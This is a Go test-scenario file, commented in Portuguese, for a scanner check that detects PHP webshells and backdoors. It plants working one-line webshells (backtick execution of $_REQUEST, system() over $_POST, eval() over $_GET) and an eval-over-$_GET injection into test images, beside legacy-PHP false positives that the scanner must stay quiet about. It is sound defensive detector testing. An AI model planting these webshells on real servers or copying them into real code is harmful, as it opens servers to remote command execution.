package scenario

// Backdoor em código servido — a peneira de webshell (app.code_backdoor).
//
//	B1  o webshell REAL de uma linha acrescentado a um bootstrap.php: crase
//	    (shell_exec do PHP) sobre $_REQUEST. É o caso que originou o check.
//
// O plantio usa printf com \140 (octal da crase) porque a raw string do Go não
// aceita backtick, e a crase é justamente o que torna a linha um shell.

func init() {
	Register(Scenario{
		ID:     "B1-webshell-php",
		Desc:   "webshell de uma linha em bootstrap.php: crase sobre $_REQUEST vira CRÍTICO; eval puro fica em aviso",
		Images: matriz,
		Plant: "mkdir -p /var/www/app\n" +
			// o webshell real do usuário: echo `$_REQUEST[0]`
			"printf '<?php\\nif(isset($_REQUEST[0])){echo \\140$_REQUEST[0]\\140;die;}\\n' > /var/www/app/bootstrap.php\n" +
			// eval puro, SEM entrada de request: tem de sair só como aviso
			"printf '<?php\\n$x = eval(\"return 1+1;\");\\n' > /var/www/app/painel.php\n" +
			// código limpo: não pode gerar nada
			"printf '<?php\\nclass Foo { function bar(){ return 1; } }\\n' > /var/www/app/limpo.php",
		Expect: []Expect{
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/var/www/app/bootstrap.php"},
			// o trecho e a linha, que é o que o operador lê
			{ID: "app.code_backdoor", Evidence: "$_REQUEST[0]"},
			{ID: "app.code_backdoor", Evidence: "crase sobre entrada"},
		},
		// painel.php (eval puro) é INFO e some no padrão; limpo.php não gera
		// nada. Nenhum dos dois pode alarmar — é o que separa peneira de ruído.
		ForbidOutput: []string{"painel.php", "limpo.php"},
		Exit:         2,
	})
}

// B2 — os cinco falsos positivos medidos num host de produção de verdade, onde
// o check rendeu oito críticos: três webshells e cinco enganos.
//
// Nenhum dos cinco vinha de "a peneira olhou mais de uma linha". Vinham de ela
// não conhecer a ESTRUTURA em volta: a allowlist que prende o valor antes do
// sink, o statement que acabou, a crase que estava dentro de uma string, o
// callback que não é o primeiro argumento, e a variável homônima de outra
// função. O cenário planta os cinco ao lado de um webshell de duas linhas: os
// cinco têm de sumir do relatório, e o webshell tem de continuar CRÍTICO.
func init() {
	Register(Scenario{
		ID:     "B2-php-legado-nao-vira-parede",
		Desc:   "cinco formas de PHP legado que pareciam backdoor não podem alarmar — e o webshell ao lado tem de continuar saindo",
		Images: matriz,
		Plant: "mkdir -p /var/www/legado\n" +
			// (a) dispatcher legado: o switch de literais É a allowlist, e
			// ?do=system não casa `case` nenhum
			"printf '<?php\\n$do = $_GET[\"do\"];\\nswitch($do) {\\ncase \"lista\":\\ncase \"conta\":\\n  $do();\\n}\\n' > /var/www/legado/router.php\n" +
			// (b) include e template: entre os dois não há `;`, e o span do
			// padrão pulava para a linha de baixo
			"printf '<?php include(\"menu.php\") ?>\\n<form action=\"<?php echo $_SERVER[\"PHP_SELF\"]; ?>\">\\n' > /var/www/legado/form.php\n" +
			// (c) crase como aspa de identificador do MySQL, e callback no 2º
			// argumento: o $_POST é o DADO filtrado, não a função executada
			"printf '<?php\\n$s = str_replace(\"\\140\",\"\\140\\140\",$_GET[\"col\"]);\\narray_filter($_POST[\"src\"], \"strlen\");\\n' > /var/www/legado/db.php\n" +
			// (d) variável de mesmo nome em outra função: coincidência, não fluxo
			"printf '<?php\\nfunction abre(){ $p = $_GET[\"page\"]; echo $p; }\\nfunction inclui(){ include($p); }\\n' > /var/www/legado/util.php\n" +
			// e o webshell de duas linhas ao lado, que é a forma mais copiada
			// que existe: a peneira não pode ter ficado cega
			"printf '<?php\\n$c = $_POST[\"c\"];\\nsystem($c);\\n' > /var/www/legado/painel.php",
		Expect: []Expect{
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/var/www/legado/painel.php"},
			{ID: "app.code_backdoor", Evidence: "sink sobre variável de entrada de request"},
		},
		// router.php sai como INFO (dispatch preso a allowlist merece leitura,
		// não alarme) e some no padrão; os outros três não geram nada.
		ForbidOutput: []string{"router.php", "form.php", "db.php", "util.php"},
		Exit:         2,
	})
}

// B3 — o VERDADEIRO POSITIVO que a leva de falsos positivos por pouco não
// afogou: o cadastro_ena/index.php de um host real (Climatempo). É `eval` de
// aritmética sobre `$_GET` — a variável recebe o request cru e entra num `eval`
// de string; o number_format que a limparia só roda DEPOIS, então a 1ª volta do
// loop executa o eval com o valor do atacante. RCE pós-autenticação.
//
// O cenário existe como TRAVA de precisão: depois de ensinar o motor a calar os
// cinco FPs de PHP legado (B2), este NÃO pode ter sido calado junto. Entre o
// $_GET e o eval não há barreira nenhuma — nem allowlist, nem string, nem
// escopo, nem callback —, e por isso continua CRÍTICO. Se uma supressão futura
// o rebaixar, esta asserção quebra.
func init() {
	Register(Scenario{
		ID:     "B3-eval-aritmetica-sobre-get",
		Desc:   "eval de string concatenando $_GET cru (RCE pós-auth de app legada) continua CRÍTICO mesmo depois de calar os FPs de PHP legado",
		Images: matriz,
		Plant: "mkdir -p /var/www/ena\n" +
			"printf '<?php\\n" +
			"//calculo legado: eval de aritmetica sobre o request\\n" +
			"if(isset($_GET[\"mlt_percent\"]) && isset($_GET[\"mlt\"])){\\n" +
			"  $calc = $_GET[\"mlt_percent\"];\\n" +
			"  foreach($dados as $item){\\n" +
			"    eval(\"\\\\$calc =\".$calc.($delta>=0?\"+\".$delta:$delta).\";\");\\n" +
			"    $calc = number_format($calc,0,\"\",\"\");\\n" +
			"  }\\n" +
			"}\\n' > /var/www/ena/index.php",
		Expect: []Expect{
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/var/www/ena/index.php"},
			// o trecho exato do sink, que é o que o operador lê
			{ID: "app.code_backdoor", Evidence: "eval(\"\\$calc ="},
			{ID: "app.code_backdoor", Evidence: "entrada de request (fluxo)"},
		},
		Exit: 2,
	})
}

// B4 — --all-fs alcança um docroot FORA da lista estática de web roots. O caso
// que o motivou: um host (FreeBSD) servindo de /usr/local/www, e árvores de
// aplicação em caminhos que a lista não previa. Sem --all-fs, um webshell ali
// passa; com ele, a FS montada inteira é varrida e o webshell aparece.
func init() {
	Register(Scenario{
		ID:     "B4-all-fs-alcanca-fora-dos-roots",
		Desc:   "--all-fs varre a FS inteira e acha o webshell num docroot que não está na lista de web roots",
		Images: matriz,
		Args:   []string{"--all-fs", "--only", "app"},
		Plant: "mkdir -p /custom/webapp /var/www/app\n" +
			// FORA de qualquer web root: só o --all-fs alcança
			"printf '<?php eval($_GET[0]);' > /custom/webapp/shell.php\n" +
			// e um dentro de /var/www, para provar que a lista continua coberta
			"printf '<?php eval($_GET[0]);' > /var/www/app/normal.php",
		Expect: []Expect{
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/custom/webapp/shell.php"},
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/var/www/app/normal.php"},
		},
		Exit: 2,
	})
}

// B5 — --ignore exclui uma árvore da varredura, e a exclusão é DECLARADA. O
// webshell irmão continua sendo achado; o que caiu sob o --ignore NÃO aparece
// como achado, mas o relatório diz que aquele caminho foi excluído.
func init() {
	Register(Scenario{
		ID:     "B5-ignore-exclui-e-declara",
		Desc:   "--ignore tira uma árvore da varredura (declarado), sem cegar o resto",
		Images: matriz,
		Args:   []string{"--ignore", "/var/www/ignoreme", "--only", "app"},
		Plant: "mkdir -p /var/www/ignoreme/deep /var/www/keep\n" +
			"printf '<?php eval($_GET[0]);' > /var/www/ignoreme/deep/shell.php\n" +
			"printf '<?php eval($_GET[0]);' > /var/www/keep/shell.php",
		Expect: []Expect{
			{ID: "app.code_backdoor", Sev: "CRITICAL", Subject: "/var/www/keep/shell.php"},
		},
		// o webshell sob --ignore NÃO pode aparecer como achado (a exclusão em si
		// sai DECLARADA na cobertura — travado em TestIgnoreExcluiArvoreEDeclara)
		ForbidOutput: []string{"ignoreme/deep/shell.php"},
		Exit:         2,
	})
}
